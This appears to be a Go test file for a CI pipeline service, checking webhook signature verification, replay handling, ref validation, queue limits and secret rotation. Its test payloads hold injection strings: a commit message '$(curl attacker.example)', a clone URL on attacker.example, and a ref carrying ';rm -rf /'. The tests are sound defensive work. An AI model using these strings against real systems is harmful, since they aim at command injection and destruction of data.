package pipelines

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"samuori.invalid/samuori/internal/authz"
	"samuori.invalid/samuori/internal/builds"
	"samuori.invalid/samuori/internal/db"
	"samuori.invalid/samuori/internal/ids"
	"samuori.invalid/samuori/internal/secrets"
	"samuori.invalid/samuori/internal/sources"
	"samuori.invalid/samuori/internal/specs"
	"samuori.invalid/samuori/internal/tenancy"
)

const (
	headCommit  = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	otherCommit = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
)

type fakeFetcher struct {
	reqs []FetchRequest
	err  error
}

func (f *fakeFetcher) Fetch(_ context.Context, r FetchRequest, archive string) (Fetched, error) {
	f.reqs = append(f.reqs, r)
	if f.err != nil {
		return Fetched{}, f.err
	}
	return Fetched{Commit: headCommit, Skipped: 1}, os.WriteFile(archive, []byte("tar"), 0o600)
}

type fakeSnapshots struct{ dir string }

func (f fakeSnapshots) Ingest(_ context.Context, _ authz.Principal, _ []authz.Role, _, archive, _ string) (sources.Snapshot, error) {
	if _, err := os.Stat(archive); err != nil {
		return sources.Snapshot{}, err
	}
	return sources.Snapshot{ID: "snap-1"}, nil
}
func (f fakeSnapshots) Staging() string        { return f.dir }
func (f fakeSnapshots) Limits() sources.Limits { return sources.DefaultLimits() }

type fakeBuilds struct{ calls []string }

func (f *fakeBuilds) Create(_ context.Context, p authz.Principal, _ []authz.Role, specID string, rev int, snap string, _ builds.CreateOptions, key, _ string) (builds.Run, error) {
	f.calls = append(f.calls, strings.Join([]string{p.ID, specID, snap, key, string(rune('0' + rev))}, " "))
	return builds.Run{ID: "build-1", State: "queued"}, nil
}

type fakeSpecs struct{}

func (fakeSpecs) Get(context.Context, authz.Principal, []authz.Role, string) (specs.Spec, error) {
	return specs.Spec{LatestRevision: 3}, nil
}

type fakeProjects struct {
	principals map[string]authz.Principal
	denied     map[string]bool
}

func (f fakeProjects) GetProject(_ context.Context, p authz.Principal, _ []authz.Role, id string) (tenancy.Project, error) {
	if f.denied[p.ID] {
		return tenancy.Project{}, tenancy.ErrForbidden
	}
	return tenancy.Project{ID: id}, nil
}

func (f fakeProjects) LoadPrincipal(_ context.Context, id string) (authz.Principal, string, error) {
	p, ok := f.principals[id]
	if !ok {
		return authz.Principal{}, "", tenancy.ErrNotFound
	}
	return p, "", nil
}

type fixture struct {
	ctx                  context.Context
	d                    *db.DB
	svc                  *Service
	fetch                *fakeFetcher
	builds               *fakeBuilds
	projects             fakeProjects
	admin, dev, robot    authz.Principal
	org, project, specID string
}

func setup(t *testing.T) *fixture {
	t.Helper()
	ctx := context.Background()
	dir := t.TempDir()
	d, err := db.Open(ctx, "sqlite://"+filepath.Join(dir, "samuori.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = d.Close() })
	if _, err := d.Migrate(ctx); err != nil {
		t.Fatal(err)
	}
	f := &fixture{ctx: ctx, d: d, fetch: &fakeFetcher{}, builds: &fakeBuilds{}, org: ids.New(), project: ids.New(), specID: ids.New()}
	f.admin = authz.Principal{ID: ids.New(), OrgID: f.org, Kind: authz.User, Bindings: []authz.Binding{{Role: authz.Administrator, ScopeType: authz.ScopeOrganization, ScopeID: f.org}}}
	f.dev = authz.Principal{ID: ids.New(), OrgID: f.org, Kind: authz.User}
	f.robot = authz.Principal{ID: ids.New(), OrgID: f.org, Kind: authz.Service}
	f.projects = fakeProjects{principals: map[string]authz.Principal{f.admin.ID: f.admin, f.dev.ID: f.dev, f.robot.ID: f.robot}, denied: map[string]bool{}}
	now := time.Now().UTC()
	for _, q := range []struct {
		sql  string
		args []any
	}{
		{`PRAGMA foreign_keys = OFF`, nil},
		{`INSERT INTO organizations (id, name, created_at) VALUES (?, 'o', ?)`, []any{f.org, now}},
		{`INSERT INTO projects (id, org_id, team_id, name, publication_mode, created_at, updated_at) VALUES (?, ?, 't', 'orders-api', 'manual', ?, ?)`, []any{f.project, f.org, now, now}},
		{`INSERT INTO build_specs (id, org_id, project_id, name, latest_revision, created_by, created_at, updated_at) VALUES (?, ?, ?, 'api', 3, 'u', ?, ?)`, []any{f.specID, f.org, f.project, now, now}},
	} {
		if _, err := d.SQL.Exec(q.sql, q.args...); err != nil {
			t.Fatal(err)
		}
	}
	sec, _ := secrets.NewService(d, filepath.Join(dir, "keys"))
	f.svc = NewService(d, sec, fakeSnapshots{dir: t.TempDir()}, f.builds, fakeSpecs{}, f.projects, f.fetch)
	return f
}

func (f *fixture) create(t *testing.T, scheme string) (Pipeline, string) {
	t.Helper()
	p, secret, err := f.svc.Create(f.ctx, f.admin, Pipeline{Name: "orders-main-" + strings.ToLower(ids.New()[20:]), ProjectID: f.project, SpecID: f.specID, RepoURL: "https://git.example/payments/orders.git",
		Refs: []string{"refs/heads/main", "refs/tags/v*"}, HookScheme: scheme, OwnerID: f.robot.ID}, "repo-read-token", "")
	if err != nil {
		t.Fatal(err)
	}
	return p, secret
}

func signed(secret, event, delivery string, body []byte) http.Header {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write(body)
	h := http.Header{}
	h.Set("X-Hub-Signature-256", "sha256="+hex.EncodeToString(mac.Sum(nil)))
	h.Set("X-GitHub-Event", event)
	if delivery != "" {
		h.Set("X-GitHub-Delivery", delivery)
	}
	return h
}

func push(ref, commit string) []byte {
	return []byte(`{"ref":"` + ref + `","after":"` + commit + `","repository":{"clone_url":"https://attacker.example/evil.git"},"head_commit":{"message":"$(curl attacker.example)"}}`)
}

func TestCreate(t *testing.T) {
	f := setup(t)
	base := Pipeline{Name: "p", ProjectID: f.project, SpecID: f.specID, RepoURL: "https://git.example/r.git", Refs: []string{"refs/heads/main"}, HookScheme: SchemeHMAC, OwnerID: f.robot.ID}
	f.projects.denied[f.admin.ID] = true
	for name, c := range map[string]func(*Pipeline){
		"ssh remote":         func(p *Pipeline) { p.RepoURL = "ssh://git@git.example/r.git" },
		"plain HTTP":         func(p *Pipeline) { p.RepoURL = "http://git.example/r.git" },
		"credentials in URL": func(p *Pipeline) { p.RepoURL = "https://u:p@git.example/r.git" },
		"file URL":           func(p *Pipeline) { p.RepoURL = "file:///srv/r.git" },
		"short ref":          func(p *Pipeline) { p.Refs = []string{"main"} },
		"ref traversal":      func(p *Pipeline) { p.Refs = []string{"refs/heads/../../x"} },
		"unknown scheme":     func(p *Pipeline) { p.HookScheme = "none" },
		"spec of another":    func(p *Pipeline) { p.ProjectID = ids.New() },
		"a human owner":      func(p *Pipeline) { p.OwnerID = f.dev.ID },
		"missing revision":   func(p *Pipeline) { p.SpecRevision = 9 },
		"username, no token": func(p *Pipeline) { p.Username = "ci" },
	} {
		p := base
		c(&p)
		if _, _, err := f.svc.Create(f.ctx, f.admin, p, "", ""); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
	if _, _, err := f.svc.Create(f.ctx, f.dev, base, "", ""); !errors.Is(err, ErrForbidden) {
		t.Fatalf("a developer created a pipeline: %v", err)
	}
	delete(f.projects.denied, f.admin.ID)
	p, secret := f.create(t, SchemeHMAC)
	if len(secret) != 64 || !p.HasToken || p.OwnerID != f.robot.ID {
		t.Fatalf("pipeline = %+v", p)
	}
	var cfg string
	_ = f.d.SQL.QueryRow(`SELECT repo_url || refs || COALESCE(username, '') FROM pipelines WHERE id = ?`, p.ID).Scan(&cfg)
	if strings.Contains(cfg, "repo-read-token") || strings.Contains(cfg, secret) {
		t.Fatal("a credential is stored outside the secret store")
	}
	if !p.Matches("refs/tags/v1.2.0") || p.Matches("refs/heads/feature") || p.Matches("refs/heads/main/../x") {
		t.Fatal("ref matching")
	}
}

func TestHooks(t *testing.T) {
	f := setup(t)
	p, secret := f.create(t, SchemeHMAC)
	body := push("refs/heads/main", otherCommit)

	t.Run("SEC-HOOK-01 forged, unknown, disabled and oversized deliveries are refused alike", func(t *testing.T) {
		cases := map[string]func() (string, http.Header, []byte){
			"wrong key":    func() (string, http.Header, []byte) { return p.ID, signed("not-the-secret", "push", "d1", body), body },
			"no signature": func() (string, http.Header, []byte) { return p.ID, http.Header{"X-Github-Event": {"push"}}, body },
			"altered body": func() (string, http.Header, []byte) {
				return p.ID, signed(secret, "push", "d1", body), push("refs/heads/main", headCommit)
			},
			"unknown": func() (string, http.Header, []byte) { return ids.New(), signed(secret, "push", "d1", body), body },
			"oversized body": func() (string, http.Header, []byte) {
				big := make([]byte, MaxHookBody+1)
				return p.ID, signed(secret, "push", "d1", big), big
			},
		}
		for name, c := range cases {
			id, h, b := c()
			if _, err := f.svc.Hook(f.ctx, id, h, b); !errors.Is(err, ErrUnverified) {
				t.Errorf("%s: %v", name, err)
			}
		}
		var denied int
		_ = f.d.SQL.QueryRow(`SELECT COUNT(*) FROM audit_events WHERE action = 'pipeline.hook' AND outcome = 'denied'`).Scan(&denied)
		if denied != 3 {
			t.Fatalf("%d denied deliveries audited", denied)
		}
	})
	t.Run("a verified push queues one run", func(t *testing.T) {
		res, err := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d1", body), body)
		if err != nil || res.Status != Queued {
			t.Fatalf("hook = %+v, %v", res, err)
		}
		again, _ := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d1", body), body)
		if again.Status != "duplicate" || again.RunID != res.RunID {
			t.Fatalf("replayed delivery = %+v", again)
		}
		fresh, _ := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d2", body), body)
		if fresh.Status != "duplicate" || fresh.RunID != res.RunID {
			t.Fatalf("replayed body under a new delivery ID = %+v", fresh)
		}
		_, _ = f.d.SQL.Exec(`UPDATE pipeline_runs SET state = 'failed' WHERE id = ?`, res.RunID)
		if late, _ := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d3", body), body); late.Status != "duplicate" {
			t.Fatalf("a replay after the run failed = %+v", late)
		}
		_, _ = f.d.SQL.Exec(`UPDATE pipeline_runs SET state = 'queued' WHERE id = ?`, res.RunID)
	})
	t.Run("SEC-HOOK-02 the payload selects a ref and nothing else", func(t *testing.T) {
		for name, b := range map[string][]byte{
			"shell in the ref": push("refs/heads/main;rm -rf /", headCommit),
			"unmatched branch": push("refs/heads/feature", headCommit),
			"not a commit":     push("refs/heads/main", "HEAD~1"),
			"deleted branch":   push("refs/heads/main", strings.Repeat("0", 40)),
			"not JSON":         []byte("ref=refs/heads/main"),
		} {
			res, err := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "x-"+name, b), b)
			if err != nil || res.Status != "ignored" {
				t.Errorf("%s: %+v %v", name, res, err)
			}
		}
		if res, _ := f.svc.Hook(f.ctx, p.ID, signed(secret, "issues", "x-issue", body), body); res.Status != "ignored" {
			t.Fatalf("non-push event = %+v", res)
		}
	})
	t.Run("processing uses the pipeline's repository and owner", func(t *testing.T) {
		found, err := f.svc.ProcessNext(f.ctx)
		if !found || err != nil {
			t.Fatalf("process = %v %v", found, err)
		}
		req := f.fetch.reqs[0]
		if req.URL != "https://git.example/payments/orders.git" || req.Ref != "refs/heads/main" || req.Token != "repo-read-token" || req.AllowPrivateNetwork {
			t.Fatalf("fetch request = %+v", req)
		}
		if len(f.builds.calls) != 1 || !strings.HasPrefix(f.builds.calls[0], f.robot.ID+" "+f.specID+" snap-1 pipeline-") || !strings.HasSuffix(f.builds.calls[0], " 3") {
			t.Fatalf("build calls = %v", f.builds.calls)
		}
		runs, _ := f.svc.Runs(f.ctx, f.admin, p.ID, 50)
		var started Run
		for _, r := range runs {
			if r.State == Started {
				started = r
			}
		}
		if started.BuildRunID != "build-1" || started.Commit != headCommit || started.SkippedEntries != 1 || started.SnapshotID != "snap-1" {
			t.Fatalf("runs = %+v", runs)
		}
		if found, _ := f.svc.ProcessNext(f.ctx); found {
			t.Fatal("skipped runs were processed")
		}
	})
	t.Run("a fetched commit that already has a build is skipped", func(t *testing.T) {
		b := push("refs/tags/v1.0.0", otherCommit[:39]+"c")
		if res, _ := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d3", b), b); res.Status != Queued {
			t.Fatalf("tag push = %+v", res)
		}
		_, _ = f.svc.ProcessNext(f.ctx)
		runs, _ := f.svc.Runs(f.ctx, f.admin, p.ID, 1)
		if runs[0].State != Skipped || len(f.builds.calls) != 1 {
			t.Fatalf("run = %+v", runs[0])
		}
	})
	t.Run("failures are recorded with safe messages", func(t *testing.T) {
		f.fetch.err = &FetchError{Code: "auth_failed", Message: "the repository refused the credentials"}
		run, err := f.svc.Start(f.ctx, f.admin, p.ID, "refs/heads/main", "manual", "")
		if err != nil {
			t.Fatal(err)
		}
		_, _ = f.svc.ProcessNext(f.ctx)
		got, _ := f.svc.run(f.ctx, run.ID)
		if got.State != Failed || got.FailureCode != "auth_failed" {
			t.Fatalf("run = %+v", got)
		}
		f.fetch.err = nil
		delete(f.projects.principals, f.robot.ID)
		run, _ = f.svc.Start(f.ctx, f.admin, p.ID, "refs/heads/main", "api", "")
		_, _ = f.svc.ProcessNext(f.ctx)
		if got, _ := f.svc.run(f.ctx, run.ID); got.State != Failed || got.FailureCode != "owner_unavailable" {
			t.Fatalf("run without an owner = %+v", got)
		}
		f.projects.principals[f.robot.ID] = f.robot
	})
	t.Run("manual runs need a build role and a matching ref", func(t *testing.T) {
		f.projects.denied[f.dev.ID] = true
		if _, err := f.svc.Start(f.ctx, f.dev, p.ID, "refs/heads/main", "manual", ""); err == nil {
			t.Fatal("someone without access started a run")
		}
		if _, err := f.svc.Start(f.ctx, f.admin, p.ID, "refs/heads/other", "manual", ""); err == nil {
			t.Fatal("an unmatched ref was started")
		}
	})
	t.Run("the queue is bounded", func(t *testing.T) {
		f.svc.MaxQueued = 1
		b1, b2 := push("refs/heads/main", strings.Repeat("1", 40)), push("refs/heads/main", strings.Repeat("2", 40))
		if res, err := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "q1", b1), b1); err != nil || res.Status != Queued {
			t.Fatalf("first = %+v %v", res, err)
		}
		if _, err := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "q2", b2), b2); !errors.Is(err, ErrBusy) {
			t.Fatalf("second = %v", err)
		}
	})
	t.Run("disabled pipelines refuse deliveries", func(t *testing.T) {
		if err := f.svc.SetEnabled(f.ctx, f.admin, p.ID, false, ""); err != nil {
			t.Fatal(err)
		}
		if _, err := f.svc.Hook(f.ctx, p.ID, signed(secret, "push", "d9", body), body); !errors.Is(err, ErrUnverified) {
			t.Fatalf("disabled = %v", err)
		}
	})
}

func TestGitLabTokenAndRotation(t *testing.T) {
	f := setup(t)
	p, secret := f.create(t, SchemeGitLab)
	body := []byte(`{"object_kind":"push","ref":"refs/heads/main","after":"` + headCommit + `","checkout_sha":"` + headCommit + `"}`)
	h := http.Header{"X-Gitlab-Event": {"Push Hook"}, "X-Gitlab-Token": {secret}, "X-Gitlab-Event-Uuid": {"u1"}}
	if res, err := f.svc.Hook(f.ctx, p.ID, h, body); err != nil || res.Status != Queued {
		t.Fatalf("gitlab = %+v %v", res, err)
	}
	if _, err := f.svc.Hook(f.ctx, p.ID, http.Header{"X-Gitlab-Event": {"Push Hook"}, "X-Gitlab-Token": {secret + "x"}}, body); !errors.Is(err, ErrUnverified) {
		t.Fatalf("wrong token = %v", err)
	}
	if _, err := f.svc.RotateHookSecret(f.ctx, f.dev, p.ID, ""); !errors.Is(err, ErrForbidden) {
		t.Fatalf("developer rotated: %v", err)
	}
	fresh, err := f.svc.RotateHookSecret(f.ctx, f.admin, p.ID, "")
	if err != nil || fresh == secret {
		t.Fatal(err)
	}
	h.Set("X-Gitlab-Event-UUID", "u2")
	if _, err := f.svc.Hook(f.ctx, p.ID, h, body); !errors.Is(err, ErrUnverified) {
		t.Fatalf("the old secret still works: %v", err)
	}
}
